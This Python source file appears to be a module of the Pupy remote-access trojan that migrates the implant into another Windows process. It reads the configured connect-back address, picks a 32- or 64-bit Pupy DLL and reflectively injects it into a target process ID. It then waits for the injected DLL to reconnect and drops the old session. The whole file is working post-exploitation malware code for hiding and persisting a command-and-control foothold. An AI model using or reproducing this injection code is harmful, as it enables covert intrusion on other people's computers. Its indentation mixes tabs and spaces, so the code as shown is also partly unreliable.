import pupygen
import time

def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
            if int(c.desc["pid"])==pid:
                return c
    return None

def migrate(module, pid, keep=False, timeout=30):
    module.client.load_package("psutil")
    module.client.load_package("pupwinutils.processes")
    dllbuf=b""
    isProcess64bits=False
    module.success("looking for configured connect back address ...")
    res=module.client.conn.modules['pupy'].get_connect_back_host()
    host, port=res.rsplit(':',1)
    module.success("address configured is %s:%s ..."%(host,port))
    module.success("looking for process %s architecture ..."%pid)
    if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
        isProcess64bits=True
        module.success("process is 64 bits")
        dllbuff=pupygen.get_edit_pupyx64_dll(module.client.get_conf())
    else:
        module.success("process is 32 bits")
        dllbuff=pupygen.get_edit_pupyx86_dll(module.client.get_conf())
    module.success("injecting DLL in target process %s ..."%pid)
    module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
    module.success("DLL injected !")
    if keep:
        return
    module.success("waiting for a connection from the DLL ...")
    time_end = time.time() + timeout
    c = False
    while time.time() < time_end:
	c=has_proc_migrated(module.client, pid)
        if c:
		module.success("got a connection from migrated DLL !")
		c.desc["id"]=module.client.desc["id"]
		time.sleep(0.1)
		try:
			module.client.conn.exit()
		except Exception:
			pass
		break
    if not c:
	module.error("migration failed")
